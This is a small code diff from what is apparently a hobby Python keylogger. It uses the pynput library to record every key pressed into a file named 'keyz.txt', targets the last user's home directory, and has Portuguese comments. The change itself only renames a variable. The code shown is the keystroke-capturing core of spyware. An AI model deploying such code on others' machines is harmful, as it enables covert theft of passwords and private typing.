@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener #imports
 import os
 
-log = 'keyz.txt'
+logs = 'keyz.txt'
 Users = os.listdir('/home/')
 user = Users[-1]
 path_log = '/home/'+ user + '/Desktop/test'
@@ -25,7 +25,7 @@ def IsSpecial(key): # substiuindo teclas pro nosso gosto
         return key
     
 def on_press(key): #Quando a tecla eh pressionada
-    arq = open(log, 'a')
+    arq = open(logs, 'a')
     arq.write(str(IsSpecial(key))+ '')
     arq.close()
     #print(IsSpecial(key))
